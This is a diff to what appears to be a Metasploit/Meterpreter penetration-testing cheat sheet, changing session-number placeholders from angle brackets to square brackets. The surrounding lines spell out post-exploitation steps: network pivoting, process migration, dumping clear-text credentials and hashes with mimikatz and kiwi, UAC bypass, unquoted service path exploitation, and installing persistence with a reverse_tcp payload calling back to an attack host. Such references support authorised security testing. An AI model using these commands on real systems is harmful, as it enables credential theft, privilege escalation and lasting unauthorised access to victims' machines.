@@ -22,10 +22,10 @@ info
 meterpreter > ifconfig
 # get <Subnet Mask of Exploited Target>
 
-route add <IP> <Subnet Mask of Exploited Target> <Session #>
+route add <IP> <Subnet Mask of Exploited Target> [Session ID]
 
 use post/multi/manage/autoroute
-set SESSION <Session #>
+set SESSION [Session ID]
 set NETMASK <Subnet Mask of Exploited Target>
 run
 ```
@@ -215,7 +215,7 @@ meterpreter > getprivs
 ##### List Windows Privileges and UAC Status
 ```bash
 use post/windows/gather/win_privs
-set SESSION <Session #>
+set SESSION [Session ID]
 ```
 
 ### Migrate to Another Process 
@@ -226,7 +226,7 @@ run post/windows/manage/migrate
 
 # As module
 use post/windows/manage/migrate
-set SESSION <Session #>
+set SESSION [Session ID]
 run
 ```
 ##### Migrate to Another Process ID
@@ -242,13 +242,13 @@ migrate -N <Process Name>.<Extension>
 ### Get Windows Credentials
 ##### Dump Clear Text Credentials with mimikatz
 ```bash
-sessions -i <Session #>
+sessions -i [Session ID]
 load mimikatz
 wdigest
 ```
 ##### Dump Clear Text Credentials and Hashes
 ```bash
-sessions -i <Session #>
+sessions -i [Session ID]
 load kiwi
 help
 creds_all
@@ -333,7 +333,7 @@ set CONNECT_ADDRESS <Remote IP for Forwarding>
 set CONNECT_PORT <Remote Port for Forwarding>
 set LOCAL_ADDRESS <Local IP for Listening>
 set LOCAL_PORT  <Local Port for Listening>
-set SESSION <Session #>
+set SESSION [Session ID]
 run
 ```
 
@@ -897,7 +897,7 @@ meterpreter > getsystem
 ##### Windows Gather Privileges Enumeration
 ```bash
 use post/windows/gather/win_privs
-set SESSION <Session #>
+set SESSION [Session ID]
 run
 ```
 ### UAC
@@ -905,16 +905,16 @@ run
 ```bash
 # Determine if UAC is enabled, if so, getsystem will fail
 use post/windows/gather/win_privs
-set SESSION <Session #>
+set SESSION [Session ID]
 run
 
 # If UAC is enabled
 search bypassuac
 use bypassuac_injection
-set SESSION <Session #>
+set SESSION [Session ID]
 # The target and the payload must match the Windows architecture (x86 or x64).
 show targets
-set TARGET <Target #>
+set TARGET [Target ID]
 set PAYLOAD windows/meterpreter/reverse_tcp or windows/x64/meterpreter/reverse_tcp
 exploit
 
@@ -930,7 +930,7 @@ impersonate_token <Token Name> # Escape \'s.
 ##### Exploit Unquoted Service Paths
 ```bash
 use exploit/windows/local/unquoted_service_path
-set SESSION <Session #>
+set SESSION [Session ID]
 exploit
 ```
 
@@ -940,7 +940,7 @@ exploit
 search persistence windows
 
 use exploit/windows/local/persistence
-set SESSION <Session #>
+set SESSION [Session ID]
 set STARTUP <Startup Type>
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <Attack Host>
